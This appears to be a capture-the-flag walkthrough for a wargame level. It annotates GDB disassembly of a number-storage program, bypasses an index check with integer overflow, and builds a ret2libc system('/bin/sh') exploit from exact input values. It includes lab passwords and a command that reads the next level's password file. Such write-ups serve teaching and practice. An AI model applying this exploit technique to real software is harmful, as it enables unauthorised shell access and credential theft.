login : pw
	level07 : GbcPDRgsFK77LNnnuh7QyFYA2942Gp8yKj9KrWD8

################################################
GDB
################################################

=> disas main
	0x08048723 <+0>:	push   ebp
	0x08048724 <+1>:	mov    ebp,esp
	0x08048726 <+3>:	push   edi
	0x08048727 <+4>:	push   esi
	0x08048728 <+5>:	push   ebx
	0x08048729 <+6>:	and    esp,0xfffffff0
	0x0804872c <+9>:	sub    esp,0x1d0
		=> p/d 0x1d0
			464
		# At most 464 bytes allocated on the stack from main function

	0x08048732 <+15>:	mov    eax,DWORD PTR [ebp+0xc]
	0x08048735 <+18>:	mov    DWORD PTR [esp+0x1c],eax
	0x08048739 <+22>:	mov    eax,DWORD PTR [ebp+0x10]
	0x0804873c <+25>:	mov    DWORD PTR [esp+0x18],eax
	0x08048740 <+29>:	mov    eax,gs:0x14
		# [ebp+0xc] = av
		# New local var, [esp+0x1c], lets call it 'avs'
		# New local var, [esp+0x18], lets call it 'envs'
		# gs:0x14, either for thread or stack corruption detection

	0x08048746 <+35>:	mov    DWORD PTR [esp+0x1cc],eax
	0x0804874d <+42>:	xor    eax,eax
		# New local var, [esp+0x1cc], lets call it 'a'

	0x0804874f <+44>:	mov    DWORD PTR [esp+0x1b4],0x0
	0x0804875a <+55>:	mov    DWORD PTR [esp+0x1b8],0x0
	0x08048765 <+66>:	mov    DWORD PTR [esp+0x1bc],0x0
	0x08048770 <+77>:	mov    DWORD PTR [esp+0x1c0],0x0
	0x0804877b <+88>:	mov    DWORD PTR [esp+0x1c4],0x0
	0x08048786 <+99>:	mov    DWORD PTR [esp+0x1c8],0x0
		# array of 4 bytes elements starting in [esp+0x1b4]
		# New local var array, [esp+0x1b4], lets call it 'arr'

	0x08048791 <+110>:	lea    ebx,[esp+0x24]
	0x08048795 <+114>:	mov    eax,0x0
	0x0804879a <+119>:	mov    edx,0x64
	0x0804879f <+124>:	mov    edi,ebx
	0x080487a1 <+126>:	mov    ecx,edx
	0x080487a3 <+128>:	rep stos DWORD PTR es:[edi],eax
		=> p/d 0x64
			100
		# New local var, [esp+0x24], lets call it 'buf'
		# Counter ecx = 100
		# Set each byte starting at 'buf' to eax value = 0

	0x080487a5 <+130>:	jmp    0x80487ea <main+199>

	0x080487a7 <+132>:	mov    eax,DWORD PTR [esp+0x1c] # Jumped from main+207
	0x080487ab <+136>:	mov    eax,DWORD PTR [eax]
	0x080487ad <+138>:	mov    DWORD PTR [esp+0x14],0xffffffff
	0x080487b5 <+146>:	mov    edx,eax
	0x080487b7 <+148>:	mov    eax,0x0
	0x080487bc <+153>:	mov    ecx,DWORD PTR [esp+0x14]
	0x080487c0 <+157>:	mov    edi,edx
	0x080487c2 <+159>:	repnz scas al,BYTE PTR es:[edi]
		# [esp+0x1c] = 'avs'
		# Will count each byte in '[avs]' until it has eax value (0)
		# counting is decrementing UINT_MAX

	0x080487c4 <+161>:	mov    eax,ecx
	0x080487c6 <+163>:	not    eax
	0x080487c8 <+165>:	lea    edx,[eax-0x1]
		# As counting was decrementing, reverse the process to get the length starting from 0
		# main+132 until main+165 is equivalent to strlen('[avs]')
		# Length stored in edx

	0x080487cb <+168>:	mov    eax,DWORD PTR [esp+0x1c]
	0x080487cf <+172>:	mov    eax,DWORD PTR [eax]
	0x080487d1 <+174>:	mov    DWORD PTR [esp+0x8],edx
	0x080487d5 <+178>:	mov    DWORD PTR [esp+0x4],0x0
	0x080487dd <+186>:	mov    DWORD PTR [esp],eax
	0x080487e0 <+189>:	call   0x80484f0 <memset@plt>
		# [esp+0x1c] = 'avs'
		# edx contains the '[avs]' length

	0x080487e5 <+194>:	add    DWORD PTR [esp+0x1c],0x4
		# [esp+0x1c] = 'avs'
		# Passes to next argument

	0x080487ea <+199>:	mov    eax,DWORD PTR [esp+0x1c] # Jumped from main+130
	0x080487ee <+203>:	mov    eax,DWORD PTR [eax]
	0x080487f0 <+205>:	test   eax,eax
	0x080487f2 <+207>:	jne    0x80487a7 <main+132>
		# [esp+0x1c] = 'avs'
		# AND bitwise setting up flags
		# Will jump if 'avs' != 0
		# Loop

	0x080487f4 <+209>:	jmp    0x8048839 <main+278>

	0x080487f6 <+211>:	mov    eax,DWORD PTR [esp+0x18]
	0x080487fa <+215>:	mov    eax,DWORD PTR [eax]
	0x080487fc <+217>:	mov    DWORD PTR [esp+0x14],0xffffffff
	0x08048804 <+225>:	mov    edx,eax
	0x08048806 <+227>:	mov    eax,0x0
	0x0804880b <+232>:	mov    ecx,DWORD PTR [esp+0x14]
	0x0804880f <+236>:	mov    edi,edx
	0x08048811 <+238>:	repnz scas al,BYTE PTR es:[edi]
	0x08048813 <+240>:	mov    eax,ecx
	0x08048815 <+242>:	not    eax
	0x08048817 <+244>:	lea    edx,[eax-0x1]
	0x0804881a <+247>:	mov    eax,DWORD PTR [esp+0x18]
	0x0804881e <+251>:	mov    eax,DWORD PTR [eax]
	0x08048820 <+253>:	mov    DWORD PTR [esp+0x8],edx
	0x08048824 <+257>:	mov    DWORD PTR [esp+0x4],0x0
	0x0804882c <+265>:	mov    DWORD PTR [esp],eax
	0x0804882f <+268>:	call   0x80484f0 <memset@plt>
	0x08048834 <+273>:	add    DWORD PTR [esp+0x18],0x4
	0x08048839 <+278>:	mov    eax,DWORD PTR [esp+0x18] # Jumped here from main+209
	0x0804883d <+282>:	mov    eax,DWORD PTR [eax]
	0x0804883f <+284>:	test   eax,eax
	0x08048841 <+286>:	jne    0x80487f6 <main+211>
		# [esp+0x18] = 'envs'
		# Exactly the same as loop main+132 to main+207 but with 'envs'

	0x08048843 <+288>:	mov    DWORD PTR [esp],0x8048b38
	0x0804884a <+295>:	call   0x80484c0 <puts@plt>
	0x0804884f <+300>:	mov    eax,0x8048d4b # Jumped here from main+679
	0x08048854 <+305>:	mov    DWORD PTR [esp],eax
	0x08048857 <+308>:	call   0x8048470 <printf@plt>
		=> x/s 0x8048b38
			0x8048b38:	 '-' <repeats 52 times>, "\n  Welcome to wil's crappy number storage service!   \n", '-' <repeats 52 times>, "\n Commands:", ' ' <repeats 31 times>...
		=> x/s 0x8048d4b
			0x8048d4b:	 "Input command: "

	0x0804885c <+313>:	mov    DWORD PTR [esp+0x1b4],0x1
		# DWORD = 4 bytes
		# arr[3] = 1

	0x08048867 <+324>:	mov    eax,ds:0x804a040
	0x0804886c <+329>:	mov    DWORD PTR [esp+0x8],eax
	0x08048870 <+333>:	mov    DWORD PTR [esp+0x4],0x14
	0x08048878 <+341>:	lea    eax,[esp+0x1b8]
	0x0804887f <+348>:	mov    DWORD PTR [esp],eax
	0x08048882 <+351>:	call   0x80484a0 <fgets@plt>
		=> x/s 0x804a040
			0x804a040 <stdin@@GLIBC_2.0>:	 ""
		p/d 0x14
			20
		# [esp+0x1b4] = arr[0]
		# [esp+0x1b8] = arr[1]
		# arr is actually a string of size 6 * 4 = 24

	0x08048887 <+356>:	lea    eax,[esp+0x1b8]
	0x0804888e <+363>:	mov    DWORD PTR [esp+0x14],0xffffffff
	0x08048896 <+371>:	mov    edx,eax
	0x08048898 <+373>:	mov    eax,0x0
	0x0804889d <+378>:	mov    ecx,DWORD PTR [esp+0x14]
	0x080488a1 <+382>:	mov    edi,edx
	0x080488a3 <+384>:	repnz scas al,BYTE PTR es:[edi]
		# [esp+0x1b8] = 'arr' + 4
		# Will count each byte in 'arr + 4' until it has eax value (0)
		# counting is decrementing UINT_MAX

	0x080488a5 <+386>:	mov    eax,ecx
	0x080488a7 <+388>:	not    eax
	0x080488a9 <+390>:	sub    eax,0x1
		# As counting was decrementing, reverse the process to get the length starting from 0
		# main+356 until main+390 is equivalent to strlen('arr + 4')
		# Length stored in eax

	0x080488ac <+393>:	sub    eax,0x1
		# Decrement length by one
		# eax = strlen('arr + 4') - 1

	0x080488af <+396>:	mov    BYTE PTR [esp+eax*1+0x1b8],0x0
		# [esp+0x1b8] = 'arr + 4'
		# eax = strlen('arr + 4') - 1
		# [esp+eax*1+0x1b8] = 'arr + 4 + eax' = 'arr + 4 + len(arr + 4) - 1'
		# Equivalent to (arr + 4)[strlen(arr + 4) - 1] = 0

	0x080488b7 <+404>:	lea    eax,[esp+0x1b8]
	0x080488be <+411>:	mov    edx,eax
	0x080488c0 <+413>:	mov    eax,0x8048d5b
	0x080488c5 <+418>:	mov    ecx,0x5
	0x080488ca <+423>:	mov    esi,edx
	0x080488cc <+425>:	mov    edi,eax
	0x080488ce <+427>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
		=> x/s 0x8048d5b
			0x8048d5b:	 "store"
		# [esp+0x1b8] = 'arr + 4'
		# Counter ecx = 5
		# Compares the first 5 bytes of 'arr + 4' and "store"
		# Stops if difference

	0x080488d0 <+429>:	seta   dl
	0x080488d3 <+432>:	setb   al
	0x080488d6 <+435>:	mov    ecx,edx
	0x080488d8 <+437>:	sub    cl,al
	0x080488da <+439>:	mov    eax,ecx
	0x080488dc <+441>:	movsx  eax,al
	0x080488df <+444>:	test   eax,eax
	0x080488e1 <+446>:	jne    0x80488f8 <main+469>
		# Test if there was a difference in 'arr + 4' and "store" comparison
		# main+404 to main+444 is equivalent to strncmp('arr + 4', "store", 5)
		# Jump if difference

	0x080488e3 <+448>:	lea    eax,[esp+0x24]
	0x080488e7 <+452>:	mov    DWORD PTR [esp],eax
	0x080488ea <+455>:	call   0x8048630 <store_number>
	0x080488ef <+460>:	mov    DWORD PTR [esp+0x1b4],eax
	0x080488f6 <+467>:	jmp    0x8048965 <main+578>
		# [esp+0x24] = 'buf'
		# Refer to '=> disas store_number'
		# [esp+0x1b4] = 'arr'
		# all string operations starts at 'arr + 4' = [esp+0x1b8]
		# 2nd times [esp+0x1b4] is used to store int
		# I suppose that they follow each other just for memory optimisation
		# Let's modify our variables
		# [esp+0x1b8] will be 'arr'
		# [esp+0x1b4] will be 'begin_arr'

	0x080488f8 <+469>:	lea    eax,[esp+0x1b8] # Jumped here from main+446
	0x080488ff <+476>:	mov    edx,eax
	0x08048901 <+478>:	mov    eax,0x8048d61
	0x08048906 <+483>:	mov    ecx,0x4
	0x0804890b <+488>:	mov    esi,edx
	0x0804890d <+490>:	mov    edi,eax
	0x0804890f <+492>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
	0x08048911 <+494>:	seta   dl
	0x08048914 <+497>:	setb   al
	0x08048917 <+500>:	mov    ecx,edx
	0x08048919 <+502>:	sub    cl,al
	0x0804891b <+504>:	mov    eax,ecx
	0x0804891d <+506>:	movsx  eax,al
	0x08048920 <+509>:	test   eax,eax
	0x08048922 <+511>:	jne    0x8048939 <main+534>
		=> x/s 0x8048d61
			0x8048d61:	 "read"
		# Equivalent to main+404 until main+446, except string is "read" and counter is 4

	0x08048924 <+513>:	lea    eax,[esp+0x24]
	0x08048928 <+517>:	mov    DWORD PTR [esp],eax
	0x0804892b <+520>:	call   0x80486d7 <read_number>
	0x08048930 <+525>:	mov    DWORD PTR [esp+0x1b4],eax
	0x08048937 <+532>:	jmp    0x8048965 <main+578>
		# [esp+0x24] = 'buf'
		# Refer to '=> disas read_number'
		# [esp+0x1b4] = 'begin_arr'

	0x08048939 <+534>:	lea    eax,[esp+0x1b8] # Jumped here from main+511
	0x08048940 <+541>:	mov    edx,eax
	0x08048942 <+543>:	mov    eax,0x8048d66
	0x08048947 <+548>:	mov    ecx,0x4
	0x0804894c <+553>:	mov    esi,edx
	0x0804894e <+555>:	mov    edi,eax
	0x08048950 <+557>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
	0x08048952 <+559>:	seta   dl
	0x08048955 <+562>:	setb   al
	0x08048958 <+565>:	mov    ecx,edx
	0x0804895a <+567>:	sub    cl,al
	0x0804895c <+569>:	mov    eax,ecx
	0x0804895e <+571>:	movsx  eax,al
	0x08048961 <+574>:	test   eax,eax
	0x08048963 <+576>:	je     0x80489cf <main+684>
		=> x/s 0x8048d66
			0x8048d66:	 "quit"
		# Equivalent to main+404 until main+446, except string is "quit" and counter is 4
		# Jump is in main+684

	0x08048965 <+578>:	cmp    DWORD PTR [esp+0x1b4],0x0 # Jumped here from main+467
	0x0804896d <+586>:	je     0x8048989 <main+614>
		# [esp+0x1b4] = 'begin_arr'

	0x0804896f <+588>:	mov    eax,0x8048d6b
	0x08048974 <+593>:	lea    edx,[esp+0x1b8]
	0x0804897b <+600>:	mov    DWORD PTR [esp+0x4],edx
	0x0804897f <+604>:	mov    DWORD PTR [esp],eax
	0x08048982 <+607>:	call   0x8048470 <printf@plt>
	0x08048987 <+612>:	jmp    0x80489a1 <main+638>
		=> x/s 0x8048d6b
			0x8048d6b:	 " Failed to do %s command\n"

	0x08048989 <+614>:	mov    eax,0x8048d88 # Jumped here from main+586
	0x0804898e <+619>:	lea    edx,[esp+0x1b8]
	0x08048995 <+626>:	mov    DWORD PTR [esp+0x4],edx
	0x08048999 <+630>:	mov    DWORD PTR [esp],eax
	0x0804899c <+633>:	call   0x8048470 <printf@plt>
		=> x/s 0x8048d88
			0x8048d88:	 " Completed %s command successfully\n"

	0x080489a1 <+638>:	lea    eax,[esp+0x1b8] # Jumped here from main+612
	0x080489a8 <+645>:	mov    DWORD PTR [eax],0x0
	0x080489ae <+651>:	mov    DWORD PTR [eax+0x4],0x0
	0x080489b5 <+658>:	mov    DWORD PTR [eax+0x8],0x0
	0x080489bc <+665>:	mov    DWORD PTR [eax+0xc],0x0
	0x080489c3 <+672>:	mov    DWORD PTR [eax+0x10],0x0
		# [esp+0x1b8] = 'arr'
		# DWORD = 4 bytes
		# This is equivalent to bzero(arr, 20)

	0x080489ca <+679>:	jmp    0x804884f <main+300>
		# Loop

	0x080489cf <+684>:	nop # Jumped here from main+576
	0x080489d0 <+685>:	mov    eax,0x0
	0x080489d5 <+690>:	mov    esi,DWORD PTR [esp+0x1cc]
	0x080489dc <+697>:	xor    esi,DWORD PTR gs:0x14
	0x080489e3 <+704>:	je     0x80489ea <main+711>
	0x080489e5 <+706>:	call   0x80484b0 <__stack_chk_fail@plt>
		# Check for stack corruption

	0x080489ea <+711>:	lea    esp,[ebp-0xc]
	0x080489ed <+714>:	pop    ebx
	0x080489ee <+715>:	pop    esi
	0x080489ef <+716>:	pop    edi
	0x080489f0 <+717>:	pop    ebp
	0x080489f1 <+718>:	ret

=> disas store_number
	0x08048630 <+0>:	push   ebp
	0x08048631 <+1>:	mov    ebp,esp
	0x08048633 <+3>:	sub    esp,0x28
		=> p/d 0x28
			40
		# At most 40 bytes allocated on the stack from store_number function

	0x08048636 <+6>:	mov    DWORD PTR [ebp-0x10],0x0
	0x0804863d <+13>:	mov    DWORD PTR [ebp-0xc],0x0
		# New local var, [ebp-0x10], lets call it 'b'
		# New local var, [ebp-0xc], lets call it 'c'

	0x08048644 <+20>:	mov    eax,0x8048ad3
	0x08048649 <+25>:	mov    DWORD PTR [esp],eax
	0x0804864c <+28>:	call   0x8048470 <printf@plt>
		=> x/s 0x8048ad3
			0x8048ad3:	 " Number: "

	0x08048651 <+33>:	call   0x80485e7 <get_unum>
	0x08048656 <+38>:	mov    DWORD PTR [ebp-0x10],eax
		# [ebp-0x10] = 'b'
		# Refer to '=> disas get_unum'

	0x08048659 <+41>:	mov    eax,0x8048add
	0x0804865e <+46>:	mov    DWORD PTR [esp],eax
	0x08048661 <+49>:	call   0x8048470 <printf@plt>
		=> x/s 0x8048add
			0x8048add:	 " Index: "

	0x08048666 <+54>:	call   0x80485e7 <get_unum>
	0x0804866b <+59>:	mov    DWORD PTR [ebp-0xc],eax
		# [ebp-0xc] = 'c'
		# Refer to '=> disas get_unum'

	0x0804866e <+62>:	mov    ecx,DWORD PTR [ebp-0xc]
	0x08048671 <+65>:	mov    edx,0xaaaaaaab
	0x08048676 <+70>:	mov    eax,ecx
	0x08048678 <+72>:	mul    edx
		=> p/u 0xaaaaaaab
			2863311531
		# [ebp-0xc] = 'c'
		# 'c' * 2863311531
		# high order 32 bits stored in edx, low order 32 bits stored in eax
		# Example:
		#		eax = 4          = 100 (binary)
		#		edx = 2863311531 = 10101010101010101010101010101011 (binary)
		#		mul instruction
		#		eax = 10101010101010101010101010101100 (binary)
		#		edx = 10 (binary)
		#	total = 4 * 2863311531 = 11453246124 = 1010101010101010101010101010101100 (binary)
		#		total = 10   10101010101010101010101010101100 = edx   eax

	0x0804867a <+74>:	shr    edx,1
		# edx being the higher part of the multiplication
		# Meaning (unsigned int)('c' * 2863311531 / UINT_MAX)
		# Meaning (unsigned int)('c' * 2863311531 / UINT_MAX) / 2
		# Divided by UINT_MAX to only keep high bits as this is interpreted as long int

	0x0804867c <+76>:	mov    eax,edx
	0x0804867e <+78>:	add    eax,eax
	0x08048680 <+80>:	add    eax,edx
		# 3 * ((unsigned int)('c' * 2863311531 / UINT_MAX) / 2)

	0x08048682 <+82>:	mov    edx,ecx
	0x08048684 <+84>:	sub    edx,eax
	0x08048686 <+86>:	test   edx,edx
	0x08048688 <+88>:	je     0x8048697 <store_number+103>
		# ecx = [ebp-0xc] = 'c'
		# 'c' - 3 * ((unsigned int)('c' * 2863311531 / UINT_MAX) / 2)
		# Jump if previous expression = 0

	0x0804868a <+90>:	mov    eax,DWORD PTR [ebp-0x10]
	0x0804868d <+93>:	shr    eax,0x18
	0x08048690 <+96>:	cmp    eax,0xb7
	0x08048695 <+101>:	jne    0x80486c2 <store_number+146>
		=> p/d 0x18
			24
		=> p/d 0xb7
			183
		# [ebp-0x10] = 'b'
		# 'b' >> 24
		# Jump if previous expression = 183
		# 24 to keep only lower 8 bits

	0x08048697 <+103>:	mov    DWORD PTR [esp],0x8048ae6 # Jumped here from store_number+88
	0x0804869e <+110>:	call   0x80484c0 <puts@plt>
	0x080486a3 <+115>:	mov    DWORD PTR [esp],0x8048af8
	0x080486aa <+122>:	call   0x80484c0 <puts@plt>
	0x080486af <+127>:	mov    DWORD PTR [esp],0x8048ae6
	0x080486b6 <+134>:	call   0x80484c0 <puts@plt>
		=> x/s 0x8048ae6
			0x8048ae6:	 " *** ERROR! ***"
		=> x/s 0x8048af8
			0x8048af8:	 "   This index is reserved for wil!"

	0x080486bb <+139>:	mov    eax,0x1
	0x080486c0 <+144>:	jmp    0x80486d5 <store_number+165>
		# return 1

	0x080486c2 <+146>:	mov    eax,DWORD PTR [ebp-0xc] # Jumped here from store_number+101
	0x080486c5 <+149>:	shl    eax,0x2
		# [ebp-0xc] = 'c'
		# 'c' << 2

	0x080486c8 <+152>:	add    eax,DWORD PTR [ebp+0x8]
		# [ebp+0x8] = 'buf'

	0x080486cb <+155>:	mov    edx,DWORD PTR [ebp-0x10]
		# [ebp-0x10] = 'b'

	0x080486ce <+158>:	mov    DWORD PTR [eax],edx
		# [buf] = 'b'
		# buf[0] = 'b'

	0x080486d0 <+160>:	mov    eax,0x0
	0x080486d5 <+165>:	leave  
	0x080486d6 <+166>:	ret

=> disas read_number
	0x080486d7 <+0>:	push   ebp
	0x080486d8 <+1>:	mov    ebp,esp
	0x080486da <+3>:	sub    esp,0x28
		=> p/d 0x28
			40
		# At most 40 bytes allocated on the stack from read_number function

	0x080486dd <+6>:	mov    DWORD PTR [ebp-0xc],0x0
		# New local var, [ebp-0xc], lets cal it 'd'

	0x080486e4 <+13>:	mov    eax,0x8048add
	0x080486e9 <+18>:	mov    DWORD PTR [esp],eax
	0x080486ec <+21>:	call   0x8048470 <printf@plt>
		=> x/s 0x8048add
			0x8048add:	 " Index: "

	0x080486f1 <+26>:	call   0x80485e7 <get_unum>
	0x080486f6 <+31>:	mov    DWORD PTR [ebp-0xc],eax
		# [ebp-0xc] = 'd'

	0x080486f9 <+34>:	mov    eax,DWORD PTR [ebp-0xc]
	0x080486fc <+37>:	shl    eax,0x2
	0x080486ff <+40>:	add    eax,DWORD PTR [ebp+0x8]
	0x08048702 <+43>:	mov    edx,DWORD PTR [eax]
		# [ebp-0xc] = 'd'
		# [ebp+0x8] = 'buf'
		# buf['d' << 2]

	0x08048704 <+45>:	mov    eax,0x8048b1b
	0x08048709 <+50>:	mov    DWORD PTR [esp+0x8],edx
	0x0804870d <+54>:	mov    edx,DWORD PTR [ebp-0xc]
	0x08048710 <+57>:	mov    DWORD PTR [esp+0x4],edx
	0x08048714 <+61>:	mov    DWORD PTR [esp],eax
	0x08048717 <+64>:	call   0x8048470 <printf@plt>
		=> x/s 0x8048b1b
			0x8048b1b:	 " Number at data[%u] is %u\n"
		# [ebp-0xc] = 'd'
		# edx = buf['d' << 2]

	0x0804871c <+69>:	mov    eax,0x0
	0x08048721 <+74>:	leave  
	0x08048722 <+75>:	ret 

=> disas get_unum
	0x080485e7 <+0>:	push   ebp
	0x080485e8 <+1>:	mov    ebp,esp
	0x080485ea <+3>:	sub    esp,0x28
		=> p/d 0x28
			40
		# At most 40 bytes allocated on stack from get_unum function

	0x080485ed <+6>:	mov    DWORD PTR [ebp-0xc],0x0
	0x080485f4 <+13>:	mov    eax,ds:0x804a060
	0x080485f9 <+18>:	mov    DWORD PTR [esp],eax
	0x080485fc <+21>:	call   0x8048480 <fflush@plt>
		=> x/s 0x804a060
			0x804a060 <stdout@@GLIBC_2.0>:

	0x08048601 <+26>:	mov    eax,0x8048ad0
	0x08048606 <+31>:	lea    edx,[ebp-0xc]
	0x08048609 <+34>:	mov    DWORD PTR [esp+0x4],edx
	0x0804860d <+38>:	mov    DWORD PTR [esp],eax
	0x08048610 <+41>:	call   0x8048500 <__isoc99_scanf@plt>
		=> x/s 0x8048ad0
			0x8048ad0:	 "%u"
		# New local var, [ebp-0xc], lets call it 'e'

	0x08048615 <+46>:	call   0x80485c4 <clear_stdin>
		# Refer to '=> disas clear_stdin'

	0x0804861a <+51>:	mov    eax,DWORD PTR [ebp-0xc]
	0x0804861d <+54>:	leave  
	0x0804861e <+55>:	ret
		# [ebp-0xc] = 'e'
		# return 'e'

=> disas clear_stdin
	0x080485c4 <+0>:	push   ebp
	0x080485c5 <+1>:	mov    ebp,esp
	0x080485c7 <+3>:	sub    esp,0x18
		=> p/d 0x18
			24
		# At most 24 bytes allocated on stack from clear_stdin function

	0x080485ca <+6>:	mov    BYTE PTR [ebp-0x9],0x0
		# New local var, [ebp-0x9], lets call it 'f'

	0x080485ce <+10>:	jmp    0x80485d1 <clear_stdin+13>

	0x080485d0 <+12>:	nop # Jumped here from clear_stdin+31
	0x080485d1 <+13>:	call   0x8048490 <getchar@plt> # Jumped here from clear_stdin+10
	0x080485d6 <+18>:	mov    BYTE PTR [ebp-0x9],al
		# [ebp-0x9] = 'f'

	0x080485d9 <+21>:	cmp    BYTE PTR [ebp-0x9],0xa
	0x080485dd <+25>:	je     0x80485e5 <clear_stdin+33>
		=> p/d 0xa
			10
		# 10 = '\n'
		# Will jump if char is '\n'

	0x080485df <+27>:	cmp    BYTE PTR [ebp-0x9],0xff
	0x080485e3 <+31>:	jne    0x80485d0 <clear_stdin+12>
		=> p/d 0xff
			255
		# Loop if char != EOF

	0x080485e5 <+33>:	leave # Jumped here from clear_stdin+25
	0x080485e6 <+34>:	ret

################################################
SUMMARY
################################################

main
	erase av and env
		We cant provide our shellcode
	get input, "read" or "store" or "quit"

quit
	leaves program

read
	calls get_unum
	Gives you the data stored at this index

store
	calls get_unum twice
	Store your data at given index but it must comply with a weird condition
		Possible to overwrite stack

get_unum
	read unsigned int from stdin and returns it
	it calls clear stdin which will consider stdin to be clean if a '\n' arrives
		The not erased stdin will be considered as an input command from main function
			This cant be exploited, rabbit hole
	
################################################
EXPLOIT
################################################

=> b *main+308
	# Right before first printf call in loop
	# Will allow to hit a breakpoint for each command and then analyse

=> r
=> x/25xw $esp+0x24
	0xffffd454:	0x00000000	0x00000000	0x00000000	0x00000000
	...
	0xffffd4b4:	0x00000000
	# buf in $esp+0x24 from main
	# 25 * 4 = 100 = buf size
	# buf initialized with 0
	# buf start address is 0xffffd454
=> p/d 0x41414141
	1094795585
=> c
=> store
	=> 1094795585
	=> 1
		# breakpoint hit
=> x/25xw $esp+0x24
	0xffffd454:	0x00000000	0x41414141	0x00000000	0x00000000
		# Memory overwritten in buf
# buf size 100 as char -> 25 as int[]
=> c
=> store
	=> 1094795585
	=> 26
		# breakpoint hit
=> x/28xw $esp+0x24
	0xffffd454:	0x00000000	0x41414141	0x00000000	0x00000000
	...
	0xffffd4b4:	0x00000000	0x00000000	0x41414141	0x00000000
	# Memory overwritten outside buf
=> c
=> store
	=> 1094795585
	=> -2
=> x/25xw $esp+(0x24-8)
	0xffffd44c:	0x41414141	0x00000000	0x00000000	0x41414141
# We can write with negative index

# Summary, we can write whatever we want wherever we want modulo the weird reserved for wil condition
# Our starting address is 0xffffd454 = index 0
# It's an int array, increased/decreased by 4 bytes
# We cant provide the program our own shell code
# We can make a ret2libc system("/bin/sh")
# We can overwrite ret eip from main only
# Indeed we will need to overwrite 2 memory zones (ret eip and params)
# Meaning we have to call store twice, so the stack would be overwritten between each call

# First I need address of system
=> info func system
	0xf7e6aed0  system
=> p/d 0xf7e6aed0
	4159090384
	# As our input is unsigned int

# Then I need "/bin/sh" address
=> info proc map
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
=> find 0xf7e2c000, 0xffffffff, "/bin/sh"
	0xf7f897ec
	# "/bin/sh" string address is 0xf7f897ec
=> p/d 0xf7f897ec
	4160264172
	# As our input is unsigned int

=> delete
=> start
=> i frame
	ebp at 0xffffd618, eip at 0xffffd61c
	# next instruction is in 0xffffd61c
=> p/d (0xffffd61c - 0xffffd454) / 4
	114
	# index from buf
=> c
=> store
	=> 4159090384
	# system func address
	=> 114
	# index from buf to overwrite ret rip from main
		This index is reserved for wil!
		# We cant overwrite main ret eip

# I need to find a way to bypass the wil error condition
# I created a program to reproduce forbidden indexes Ressources/wil_index.c
# Holy moly, that's just a modulo 3, oh boy gcc please use div next time !!
# Second check is the MSB of the input number cannot be 0xb7

# So lets sum up, the main function ret rip index modul 3 gives 0
# index is stored as an unsigned int and the crazy modulo check is done on it
# Afterwards the index is shifted left twice = multiplied by 4
# Then we store the data
# We can overflow the index due to the modification

# Remember:
#	system address = 4159090384
#	"/bin/sh" address = 4160264172
#	Buf start address = 0xffffd454
#	ret eip index from buffer start address = 114

# Multiplication by 4 needs to overflow it
# UINT_MAX / 4 should give index 0
=> echo '2^32/4' | bc
	1073741824
=> echo '1073741824+114' | bc
	1073741938
	# Should be index 114
=> python3 -c 'print(1073741938 % 3)'
	1
	# Ok for system address to put

# In asm, the stack look like this when a function is called
# [ret address] [params] ...
# I need to skip the return address index (115)
# So I need to put the "/bin/sh" address in index 116

=> python3 -c 'print(116 % 3)'
	2
	# Ok for "/bin/sh" address to put

# I guess, that's won. Lets try
=> ./level07
	=> store
		=> 4159090384 # system addr uint
		=> 1073741938 # overflowed uint to give 114
	=> store
		=> 4160264172 # "/bin/sh" addr uint
		=> 116 # eip + 2
	=> quit
		# shell starts

=> cat /home/users/level08/.pass
	7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
